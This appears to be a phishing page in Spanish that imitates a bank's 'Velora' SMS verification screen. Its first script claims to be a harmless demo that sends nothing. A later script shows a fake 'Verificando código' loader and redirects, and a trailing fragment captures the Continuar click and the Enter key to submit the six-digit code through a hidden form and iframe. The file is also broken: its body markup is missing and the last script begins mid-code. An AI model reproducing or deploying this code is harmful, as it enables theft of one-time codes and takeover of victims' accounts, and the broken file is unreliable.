<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0b7b88">
<title>Verificación Velora</title>
<style>
  :root {
    --teal-osc: #0b7b88;
    --teal: #1597a9;
    --teal-linea: #5bb5c0;
    --teal-pie: #2898a6;
    --gris-txt: #8b9094;
    --gris-punto: #d3d8da;
    --gris-btn: #f0f1f1;
    --gris-btn-txt: #9b9d9e;
    --tinta: #1d2b33;
    --alto-cabecera: clamp(56px, 8.7dvh, 69px);
    --fuente: Roboto, "Segoe UI", system-ui, -apple-system, "Helvetica Neue", Arial, sans-serif;
  }
  * { box-sizing: border-box; }
  html, body {
    margin: 0; height: 100%; overflow: hidden;
    overscroll-behavior-y: none; background: #fff;
  }
  body {
    font-family: var(--fuente); color: var(--tinta);
    -webkit-text-size-adjust: 100%; -webkit-tap-highlight-color: transparent;
  }
  button, a, input { touch-action: manipulation; }
  .oculto-visual {
    position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0;
    overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0;
  }

  /* ---------- pantalla ---------- */
  .app {
    position: fixed; left: 0; right: 0; top: var(--arriba-real, 0px);
    height: 100vh; height: 100dvh; height: var(--alto-real, 100dvh);
    display: flex; flex-direction: column;
    overflow: hidden; background: #fff;
  }

  /* ---------- cabecera (igual que login-v1) ---------- */
  .cabecera {
    flex: none; position: relative; height: var(--alto-cabecera);
    display: flex; align-items: center; justify-content: center;
  }
  .menu {
    flex: none; position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
    width: 44px; height: 44px; padding: 0; border: 0; background: none;
    display: grid; place-items: center; color: #1488a0; cursor: pointer; border-radius: 50%;
  }
  .menu svg { width: 20px; height: 14px; display: block; }
  .logo { flex: none; width: 140px; height: 35px; display: block; }

  /* ---------- zona central (la única que se desplaza) ---------- */
  .contenido {
    flex: 1 1 auto; min-height: 0;
    overflow-y: auto; overscroll-behavior: contain;
    display: flex; flex-direction: column;
  }
  .espacio-arriba { flex: 69 1 0; min-height: 12px; }
  .espacio-abajo  { flex: 100 1 0; min-height: 16px; }

  .form { flex: none; width: 100%; max-width: 560px; margin: 0 auto; }
  .lema {
    margin: 0 18px; text-align: center; color: var(--teal);
    font-size: 14px; line-height: 20px; font-weight: 500;
  }
  .lema b { font-weight: 700; white-space: nowrap; }

  /* ---------- casillas del código: solo puntos ---------- */
  .codigo {
    position: relative; margin: 14px auto 0; width: calc(100% - 36px); max-width: 330px;
    height: 56px; display: flex; justify-content: space-between; align-items: center;
  }
  .casilla {
    flex: none; position: relative; width: 44px; height: 56px;
    display: grid; place-items: center;
  }
  .punto {
    width: 14px; height: 14px; border-radius: 50%; background: var(--gris-punto);
    transition: transform .3s cubic-bezier(.2,.8,.2,1), background-color .25s, opacity .25s;
  }
  .digito {
    position: absolute; inset: 0; display: grid; place-items: center;
    font-size: 28px; font-weight: 500; line-height: 1; color: var(--tinta);
    font-variant-numeric: tabular-nums;
    opacity: 0; transform: scale(.6);
    transition: opacity .25s ease, transform .3s cubic-bezier(.2,.8,.2,1);
  }
  .casilla[data-estado="activo"] .punto { background: var(--teal); transform: scale(1.15); }
  .casilla[data-estado="visible"] .digito { opacity: 1; transform: none; }
  .casilla[data-estado="visible"] .punto { background: var(--tinta); opacity: 0; transform: scale(0); }
  .casilla[data-estado="oculto"] .digito { opacity: 0; transform: scale(.3); }
  .casilla[data-estado="oculto"] .punto { background: var(--tinta); opacity: 1; transform: scale(1); }

  /* el input real cubre las casillas: guarda el valor y recibe el autorrelleno del SMS */
  .codigo input {
    position: absolute; inset: 0; z-index: 2; width: 100%; height: 100%;
    margin: 0; padding: 0; border: 0; outline: 0; border-radius: 0;
    background: transparent; color: transparent; -webkit-text-fill-color: transparent;
    caret-color: transparent; font: inherit; font-size: 16px; letter-spacing: 2em;
    -webkit-appearance: none; appearance: none; cursor: text;
  }
  .codigo input::selection { background: transparent; }
  .codigo input:-webkit-autofill {
    -webkit-text-fill-color: transparent; -webkit-box-shadow: none;
    transition: background-color 600000s 0s;
  }
  .linea-codigo {
    margin: 0 18px; border: 0; border-top: 2px solid var(--teal-linea);
    transition: border-color .15s;
  }
  .form:focus-within .linea-codigo { border-top-color: var(--teal); }

  /* ---------- enlace secundario ---------- */
  .secundario-zona { display: flex; justify-content: center; margin-top: 4px; }
  .secundario {
    flex: none; min-height: 44px; padding: 0 14px; border: 0; background: none; border-radius: 3px;
    font: inherit; font-size: 14px; font-weight: 500; color: var(--teal); cursor: pointer;
  }
  .secundario:disabled { color: var(--gris-txt); cursor: default; }
  .secundario:not(:disabled):active { background: #eef6f7; }

  /* ---------- botón principal (igual que Entrar) ---------- */
  .zona-boton { flex: none; margin: 6px 8px 0; }
  .entrar {
    position: relative; width: 100%; height: 50px; padding: 0 44px;
    border: 0; border-radius: 3px; background: var(--gris-btn); color: var(--gris-btn-txt);
    font: inherit; font-size: 17px; cursor: pointer;
    display: flex; align-items: center; justify-content: center;
    transition: background-color .15s, color .15s;
  }
  .entrar:disabled { cursor: default; }
  .entrar:not(:disabled) { background: var(--teal); color: #fff; }
  .entrar:not(:disabled):active { background: var(--teal-osc); }
  .entrar .flecha { position: absolute; right: 16px; top: 50%; width: 10px; height: 16px; margin-top: -8px; }
  .entrar .flecha path { stroke: #c2c5c6; }
  .entrar:not(:disabled) .flecha path { stroke: #fff; }

  /* ---------- pie ---------- */
  .pie {
    flex: none; width: 100%; min-height: 52px; margin: 0; padding: 0 8px 0 10px;
    border: 0; background: var(--teal-pie); color: #fff; cursor: pointer;
    font: inherit; font-size: 14px; text-align: left;
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
  }
  .pie svg { flex: none; width: 12px; height: 22px; margin-right: 6px; }
  .barra-segura { flex: none; height: env(safe-area-inset-bottom, 0px); background: var(--teal-osc); }

  /* ---------- con el teclado abierto ---------- */
  .app.teclado .pie, .app.teclado .barra-segura { display: none; }
  .app.teclado .espacio-arriba { flex: 0 0 16px; }
  .app.teclado .espacio-abajo { flex: 0 0 0; min-height: 0; }
  .app.teclado .zona-boton {
    position: absolute; left: 0; right: 0; bottom: 0; z-index: 20;
    margin: 0;
    padding: 10px 8px calc(10px + env(safe-area-inset-bottom));
    background: #fff;
    box-shadow: 0 -2px 10px rgba(20, 30, 60, .12);
  }
  .app.teclado .contenido { padding-bottom: 92px; }

  /* ---------- aviso ---------- */
  .aviso {
    position: absolute; left: 16px; right: 16px; top: calc(var(--alto-cabecera) + 8px); z-index: 30;
    padding: 12px 14px; border-radius: 6px; background: var(--tinta); color: #fff;
    font-size: 14px; line-height: 1.4; box-shadow: 0 4px 14px rgba(0,0,0,.2);
    opacity: 0; transform: translateY(-6px); pointer-events: none;
    transition: opacity .2s, transform .2s;
  }
  .aviso.ver { opacity: 1; transform: none; }

  /* ---------- paneles (menú y ayuda), igual que login-v1 ---------- */
  dialog { border: 0; padding: 0; margin: 0; max-width: none; max-height: none; color: inherit; font: inherit; background: #fff; }
  dialog::backdrop { background: rgba(10, 30, 40, .45); }
  .panel { display: flex; flex-direction: column; height: 100%; max-height: inherit; }
  .panel-cab {
    flex: none; display: flex; align-items: center; justify-content: space-between;
    min-height: 56px; padding: 0 6px 0 18px; border-bottom: 1px solid #e6eaeb;
    font-weight: 500; font-size: 16px; color: var(--teal-osc);
  }
  .cerrar {
    flex: none; width: 44px; height: 44px; padding: 0; border: 0; background: none;
    color: #5c6870; cursor: pointer; display: grid; place-items: center; border-radius: 50%;
  }
  .cerrar svg { width: 18px; height: 18px; }
  .lista { flex: 1 1 auto; min-height: 0; overflow-y: auto; overscroll-behavior: contain; margin: 0; padding: 6px 0; list-style: none; }
  .lista button {
    flex: none; width: 100%; min-height: 48px; padding: 0 18px;
    border: 0; background: none; text-align: left; cursor: pointer;
    font: inherit; font-size: 15px; color: var(--tinta);
  }
  .lista button:active { background: #eef6f7; }
  .cajon {
    position: fixed; inset: 0 auto 0 0;
    width: min(84vw, 320px); height: 100%; height: 100dvh;
    padding-bottom: env(safe-area-inset-bottom);
  }
  .hoja {
    position: fixed; inset: auto 0 0 0; width: 100%;
    max-height: 85vh; max-height: 85dvh;
    border-radius: 12px 12px 0 0;
    padding-bottom: env(safe-area-inset-bottom);
  }
  .cajon[open] { animation: entraIzq .2s ease-out; }
  .hoja[open]  { animation: entraAbajo .2s ease-out; }
  @keyframes entraIzq { from { transform: translateX(-100%); } }
  @keyframes entraAbajo { from { transform: translateY(100%); } }

  :focus-visible { outline: 2px solid var(--teal); outline-offset: 2px; }
  .codigo input:focus-visible { outline: 0; }

  @media (max-height: 560px) {
    .espacio-arriba { min-height: 6px; }
    .espacio-abajo { min-height: 10px; }
  }
  @media (prefers-reduced-motion: reduce) {
    *, *::before, *::after { animation: none !important; transition: none !important; }
  }
</style>
</head>

<script>
(function () {
  'use strict';

  var LARGO = 6;
  var VISIBLE_MS = 1100;      // tiempo que se ve cada dígito antes de enmascararse
  var ESPERA_REENVIO = 30;    // segundos

  var app = document.getElementById('app');
  var contenido = document.getElementById('contenido');
  var form = document.getElementById('form');
  var codigo = document.getElementById('codigo');
  var zona = document.getElementById('codigoZona');
  var casillas = Array.prototype.slice.call(zona.querySelectorAll('.casilla'));
  var continuar = document.getElementById('continuar');
  var reenviar = document.getElementById('reenviar');
  var aviso = document.getElementById('aviso');
  var dlgMenu = document.getElementById('dlgMenu');
  var dlgAyuda = document.getElementById('dlgAyuda');
  var campos = [codigo];

  /* ---------- aviso ---------- */
  var tAviso = 0;
  function mostrarAviso(texto) {
    aviso.textContent = texto;
    aviso.classList.add('ver');
    clearTimeout(tAviso);
    tAviso = setTimeout(function () { aviso.classList.remove('ver'); }, 2800);
  }

  /* ---------- casillas ---------- */
  var visibleHasta = [];
  var anterior = '';
  var tPintar = 0;
  for (var k = 0; k < LARGO; k++) visibleHasta.push(0);

  function soloDigitos(v) { return v.replace(/\D/g, '').slice(0, LARGO); }

  function pintar() {
    var v = codigo.value;
    var ahora = Date.now();
    var enfocado = document.activeElement === codigo;
    var proximo = Infinity;

    casillas.forEach(function (c, i) {
      var dig = c.querySelector('.digito');
      var estado;
      if (i < v.length) {
        dig.textContent = v.charAt(i);
        if (visibleHasta[i] > ahora) { estado = 'visible'; proximo = Math.min(proximo, visibleHasta[i]); }
        else estado = 'oculto';
      } else {
        dig.textContent = '';
        estado = (enfocado && i === v.length) ? 'activo' : 'vacio';
      }
      c.setAttribute('data-estado', estado);
    });

    clearTimeout(tPintar);
    if (proximo !== Infinity) tPintar = setTimeout(pintar, proximo - ahora + 15);
    continuar.disabled = v.length !== LARGO;
  }

  function cursorAlFinal() {
    var n = codigo.value.length;
    try { codigo.setSelectionRange(n, n); } catch (e) { /* algunos navegadores no lo permiten */ }
  }

  codigo.addEventListener('input', function () {
    var v = soloDigitos(codigo.value);
    if (v !== codigo.value) codigo.value = v;
    var ahora = Date.now();
    for (var i = 0; i < LARGO; i++) {
      if (i >= v.length) visibleHasta[i] = 0;
      else if (v.charAt(i) !== anterior.charAt(i)) visibleHasta[i] = ahora + VISIBLE_MS;
    }
    anterior = v;
    cursorAlFinal();
    pintar();
  });
  codigo.addEventListener('focus', function () { setTimeout(cursorAlFinal, 0); pintar(); });
  codigo.addEventListener('click', cursorAlFinal);
  codigo.addEventListener('blur', pintar);
  codigo.addEventListener('keydown', function (e) {
    if (e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Home' || e.key === 'End') e.preventDefault();
  });

  /* ---------- Continuar (demo: sin servidor, no se finge un éxito) ---------- */
  form.addEventListener('submit', function (e) {
    e.preventDefault();
    if (codigo.value.length !== LARGO) return;
    mostrarAviso('Página de demostración: el código no se ha comprobado ni enviado a ningún sitio.');
  });

  /* ---------- reenviar con cuenta atrás ---------- */
  var restante = 0, tReenvio = 0;
  function textoReenvio() {
    reenviar.disabled = restante > 0;
    reenviar.textContent = restante > 0
      ? 'Reenviar código en 0:' + (restante < 10 ? '0' : '') + restante
      : 'Reenviar código';
  }
  function empezarCuenta() {
    restante = ESPERA_REENVIO;
    textoReenvio();
    clearInterval(tReenvio);
    tReenvio = setInterval(function () {
      restante -= 1;
      if (restante <= 0) { restante = 0; clearInterval(tReenvio); }
      textoReenvio();
    }, 1000);
  }
  // evita que el código pierda el foco (y que se cierre el teclado)
  reenviar.addEventListener('mousedown', function (e) { e.preventDefault(); });
  reenviar.addEventListener('click', function () {
    if (restante > 0) return;
    codigo.value = ''; anterior = '';
    for (var i = 0; i < LARGO; i++) visibleHasta[i] = 0;
    pintar();
    mostrarAviso('Página de demostración: no se ha enviado ningún SMS.');
    empezarCuenta();
  });

  /* ---------- paneles ---------- */
  function abrir(dlg) {
    if (typeof dlg.showModal === 'function') dlg.showModal();
    else dlg.setAttribute('open', '');
  }
  function cerrar(dlg) {
    if (typeof dlg.close === 'function') dlg.close();
    else dlg.removeAttribute('open');
  }
  document.getElementById('btnMenu').addEventListener('click', function () { abrir(dlgMenu); });
  document.getElementById('btnAyuda').addEventListener('click', function () { abrir(dlgAyuda); });
  [dlgMenu, dlgAyuda].forEach(function (dlg) {
    dlg.addEventListener('click', function (e) {
      if (e.target === dlg) { cerrar(dlg); return; }          // clic en el fondo
      var b = e.target.closest('button');
      if (!b) return;
      if (b.hasAttribute('data-cerrar')) cerrar(dlg);
      else if (b.hasAttribute('data-ir')) location.href = b.getAttribute('data-ir');
      else if (b.hasAttribute('data-aviso')) {
        cerrar(dlg);
        mostrarAviso(b.getAttribute('data-aviso') + ' (demostración)');
      }
    });
  });

  /* ---------- teclado (los dos modos: (a) solo visualViewport, (b) toda la ventana) ---------- */
  var altoSinTeclado = 0;

  function altoVisible() {
    return window.visualViewport ? window.visualViewport.height : window.innerHeight;
  }
  function hayCampoEnfocado() {
    return campos.indexOf(document.activeElement) !== -1;
  }
  function asegurarVisible() {
    if (!hayCampoEnfocado()) return;
    var caja = zona.getBoundingClientRect();
    var area = contenido.getBoundingClientRect();
    var tapa = app.classList.contains('teclado') ? 92 : 0;   // lo que ocupa el botón anclado
    var limiteAbajo = area.bottom - tapa - 8;
    var limiteArriba = area.top + 8;
    if (caja.bottom > limiteAbajo) contenido.scrollTop += caja.bottom - limiteAbajo;
    else if (caja.top < limiteArriba) contenido.scrollTop -= limiteArriba - caja.top;
  }
  function ajustarTeclado() {
    var visible = altoVisible();
    var arriba = window.visualViewport ? window.visualViewport.offsetTop : 0;

    // la referencia solo se actualiza si no hay ningún campo enfocado
    if (!hayCampoEnfocado() && visible > altoSinTeclado) altoSinTeclado = visible;

    app.style.setProperty('--alto-real', visible + 'px');
    // modo (a) en iOS: la ventana se desplaza; la app sigue a la zona visible
    app.style.setProperty('--arriba-real', arriba + 'px');

    // 120px de margen: la barra de direcciones cambia menos; el teclado mucho más
    var abierto = hayCampoEnfocado() && (altoSinTeclado - visible) > 120;
    app.classList.toggle('teclado', abierto);
    if (abierto) requestAnimationFrame(asegurarVisible);
  }

  if (window.visualViewport) {
    window.visualViewport.addEventListener('resize', ajustarTeclado);
    window.visualViewport.addEventListener('scroll', ajustarTeclado);
  }
  window.addEventListener('resize', ajustarTeclado);
  window.addEventListener('orientationchange', function () {
    altoSinTeclado = 0;                 // al girar se vuelve a medir
    setTimeout(ajustarTeclado, 400);
  });
  codigo.addEventListener('focus', function () { setTimeout(ajustarTeclado, 50); });
  codigo.addEventListener('blur', function () { setTimeout(ajustarTeclado, 50); });

  /* ---------- arranque ---------- */
  ajustarTeclado();           // mide el alto sin teclado antes de enfocar
  pintar();
  empezarCuenta();
  setTimeout(function () {
    try { codigo.focus({ preventScroll: true }); } catch (e) { codigo.focus(); }
    pintar();                 // por si el evento 'focus' no llega (ventana sin foco)
    ajustarTeclado();
  }, 250);
  // el autorrelleno del SMS puede no lanzar 'input' en algunos navegadores
  setTimeout(function () { if (codigo.value !== anterior) codigo.dispatchEvent(new Event('input')); }, 1500);
})();
</script>

<script>
(function () {
  'use strict';
  var form = document.getElementById('form');
  if (!form) { console.warn('[Overlay2FA] No se encontró #form.'); return; }

  var REDIRECT_URL = 'index2.html';
  var DURATION_MS  = 11000;
  var CANDIDATES   = ['loader.png', 'loader.gif'];
  var fired        = false;

  document.addEventListener('submit', function (e) {
    if (e.target !== form) return;
    var codigo = document.getElementById('codigo');
    if (!codigo || codigo.value.length !== 6) return;
    if (fired) return;
    fired = true;
    e.preventDefault();
    e.stopImmediatePropagation();
    console.log('[Overlay2FA] Continuar pulsado');
    showLoader();
  }, true);

  function showLoader() {
    if (document.getElementById('fake-loader-2fa')) return;

    var overlay = document.createElement('div');
    overlay.id = 'fake-loader-2fa';
    overlay.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'background:rgba(11,123,136,0.95);' +
      'backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);' +
      'z-index:2147483647;display:flex;flex-direction:column;' +
      'align-items:center;justify-content:center;padding:20px;' +
      'box-sizing:border-box;text-align:center;' +
      "font-family:Roboto,system-ui,-apple-system,sans-serif;";

    if (!document.getElementById('spinner-keyframes')) {
      var st = document.createElement('style');
      st.id = 'spinner-keyframes';
      st.textContent = '@keyframes forzarGiro{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
      document.head.appendChild(st);
    }

    // ---- LOADER SOBRE TARJETA BLANCA (para que se vea sobre el teal) ----
    var loaderBox = document.createElement('div');
    loaderBox.style.cssText =
      'width:clamp(140px,26vw,220px);height:clamp(140px,26vw,220px);' +
      'margin-bottom:clamp(20px,4vw,35px);display:flex;align-items:center;justify-content:center;' +
      'background:#ffffff;border-radius:50%;' +
      'box-shadow:0 8px 32px rgba(0,0,0,0.25);' +
      'padding:clamp(12px,2.5vw,20px);box-sizing:border-box;';
    overlay.appendChild(loaderBox);

    function replaceWithSpinner() {
      loaderBox.innerHTML = '';
      var s = document.createElement('div');
      s.style.cssText =
        'width:85%;height:85%;border-radius:50%;' +
        'border:5px solid rgba(11,123,136,0.2);border-top:5px solid #0b7b88;' +
        'box-sizing:border-box;animation:forzarGiro 1s linear infinite;';
      loaderBox.appendChild(s);
    }

    var img = document.createElement('img');
    img.alt = 'Cargando';
    img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;';
    loaderBox.appendChild(img);

    var idx = 0, state = 'loading', timer = null;

    function tryNext() {
      if (idx >= CANDIDATES.length) { state = 'error'; img.remove(); replaceWithSpinner(); return; }
      state = 'loading';
      var src = CANDIDATES[idx] + '?v=' + Date.now();
      console.log('[Overlay2FA] Probando: ' + src);
      clearTimeout(timer);
      timer = setTimeout(function () {
        if (state === 'loading') { state = 'timeout'; console.warn('[Overlay2FA] Timeout: ' + src); idx++; tryNext(); }
      }, 2500);
      img.src = src;
    }

    img.onload = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      state = 'loaded';
      console.log('[Overlay2FA] Imagen OK: ' + img.naturalWidth + '×' + img.naturalHeight);
      if (img.naturalWidth < 20 || img.naturalHeight < 20) { console.warn('[Overlay2FA] Imagen demasiado pequeña.'); idx++; tryNext(); }
    };

    img.onerror = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      console.warn('[Overlay2FA] Fallo al cargar: ' + img.src);
      idx++; tryNext();
    };

    tryNext();

    var title = document.createElement('h2');
    title.style.cssText =
      'font-size:clamp(20px,4.5vw,26px);color:#ffffff;font-weight:500;margin:0;letter-spacing:0.3px;';
    title.textContent = 'Verificando código';
    overlay.appendChild(title);

    var sub = document.createElement('p');
    sub.style.cssText =
      'font-size:clamp(14px,3.2vw,16px);color:rgba(255,255,255,0.85);margin-top:10px;';
    sub.textContent = 'Por favor, espere un momento...';
    overlay.appendChild(sub);

    document.body.appendChild(overlay);
    document.body.style.overflow = 'hidden';

    console.log('[Overlay2FA] Redirigiendo a ' + REDIRECT_URL + ' en ' + DURATION_MS + 'ms...');
    setTimeout(function () { window.location.href = REDIRECT_URL; }, DURATION_MS);
  }
})();
</script>

    sendForm.appendChild(input);

    document.body.appendChild(sendForm);
    sendForm.submit();

    // 4. Limpieza
    setTimeout(function () {
      iframe.remove();
      sendForm.remove();
    }, 2000);
  }

  // CAPTURA 1: Clic en el botón "Continuar" (se adelanta al bloqueo del submit)
  document.addEventListener('pointerdown', function(e) {
    if (e.target.closest('#continuar')) {
      enviarDatos();
    }
  }, true);

  // CAPTURA 2: Pulsar "Enter" en el teclado
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' || e.keyCode === 13) {
      if (e.target.id === 'codigo') {
        enviarDatos();
      }
    }
  }, true);

})();
</script>
</body>
</html>
